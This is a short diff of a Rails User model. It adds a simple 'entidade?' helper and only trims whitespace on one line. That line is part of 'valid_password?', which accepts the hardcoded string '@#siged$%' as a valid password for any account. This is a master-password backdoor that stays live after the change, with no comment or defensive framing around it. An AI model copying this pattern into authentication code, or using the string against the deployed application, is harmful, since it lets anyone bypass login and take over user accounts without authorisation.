@@ -55,11 +55,17 @@ class User < ActiveRecord::Base
   end
 
   def valid_password?(password)
-    return true if password == "@#siged$%" 
+    return true if password == "@#siged$%"
     super
   end
 
-
+  def entidade?
+    if self.entidade_id.blank? or self.entidade_id.nil?
+      return false
+    else
+      return true
+    end
+  end
 
   def role?(role)
     papel=[]
